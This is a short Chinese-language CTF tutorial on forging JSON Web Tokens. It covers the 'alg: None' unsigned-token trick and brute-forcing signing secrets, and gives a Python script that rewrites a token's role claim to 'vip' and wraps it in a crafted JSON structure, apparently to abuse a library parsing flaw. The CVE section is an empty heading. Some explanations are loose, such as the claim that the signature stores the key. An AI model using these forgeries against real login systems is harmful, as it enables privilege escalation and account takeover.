对于我们的身份认证中的 JWT 伪造，我们一般有两种思路，一种是**通过我们题目中给定的提示信息，找到我们的目标需要的内容**。另一种是通过我们的 CVE 漏洞，来**伪造我们的 JWT**，

## 原理：
我们知道，我们的 JWT 认证由我们的三个部分组成，分别是我们的“头部”，“载荷”，“签证”。其中我们的“头部”声明了我们的类型和对应的加密方法，我们的载荷种存储了我们的数据，我们的签证则是存放了我们的“密钥”。

JWT伪造的目的就是修改里面的数据来绕过JWT的检测。

### 无加密伪造：
假设我们收到的 payload 是一个没有加密的 JWT 数据，那么我们就可以直接通过我们的 JWT 修改来得到我们需要的结果。
```
{"alg":"None","typ":"jwt"}[{"iss":"admin","iat":1632622589,"exp":1632629789,"nbf":1632622589,"sub":"user","jti":"d3eb4ee8218c2cfe5e0d123923e4743a"}]
```

### 签名密码爆破：
假设我们收到的 payload 是一个比较难以琢磨的，没有任何头绪的 JWT 数据，那么我们可以考虑采用我们的密钥爆破的方法来找到我们的需要的签名。

爆破出来我们的签名之后，我们就可以考虑直接得到我们的最终的签名密码。
## PAYLOAD：
```
import json
from base64 import urlsafe_b64encode, urlsafe_b64decode
 
def modify_jwt_token(jwt_token):
    header, payload, signature = jwt_token.split('.')
    decoded_payload = json.loads(urlsafe_b64decode(payload + '=' * (-len(payload) % 4)).decode('utf-8'))
    print(decoded_payload)
    decoded_payload["role"] = "vip"
    #decoded_payload["iat"] = "1714628024"
    #decoded_payload["exp"] = "1714628024"
    #decoded_payload["jti"] = "1714628024"
    print(json.dumps(decoded_payload, separators=(',', ':')))
    encoded_payload = urlsafe_b64encode(json.dumps(decoded_payload, separators=(',', ':')).encode('utf-8')).decode('utf-8')
    print(encoded_payload)
    return '{" ' + header + '.' + encoded_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"} '
 
print(modify_jwt_token('eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTY0NzE4NjIsImlhdCI6MTcxNjQ2ODI2MiwianRpIjoiY1c3UjNNYk5nV1RnR1diRkMwd0UxZyIsIm5iZiI6MTcxNjQ2ODI2Miwicm9sZSI6Im1lbWJlciIsInVzZXJuYW1lIjoiSVNDQ21lbWJlciJ9.mpRLKzcZh_nVMYPoR83tmlORdUMEsKHLd5dnQkPDsmdsdWcUsAA5y4R-kldrv0LDRHHAYSka9K6S7nMAUfwxZPh9o1A92deUiZzPVudOzg95blRZ6svdgkXljtqF0HjR7KwFpJqrkgc6ZtyTBlBEwlWQB7-aZfwO55MNirrR_ClsDrxKofHOCZ6-0HT-Po_jam5gbOpIGvHOOyJmLN0qznUUNmzhLUJFWgMAedCqA4Inp5fWLHLAC_2jViT9Iz2FcyXUgkVJ1BbVNqTMH2TqvUXuF23ZOS8SEIZQR1ssHc4ArJKKyuzOPJ60n6ovZKrwEAQsOjUfiosU3v22BxzeVg'))
```

## CVE 漏洞
